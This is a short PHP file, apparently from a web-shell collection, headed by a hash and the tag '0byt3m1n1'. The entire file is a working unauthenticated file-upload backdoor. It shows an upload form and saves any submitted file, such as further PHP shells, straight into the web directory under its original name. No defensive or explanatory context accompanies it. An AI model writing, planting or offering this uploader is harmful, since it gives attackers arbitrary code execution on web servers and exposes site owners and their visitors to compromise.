c4e758b00c25ade40a8d29c6cccef6c4 0byt3m1n1
<?php
$nemoshell = $_FILES['file']['name'];
$nemohero  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='submit' /></form>";
move_uploaded_file($nemohero,$nemoshell);
?>
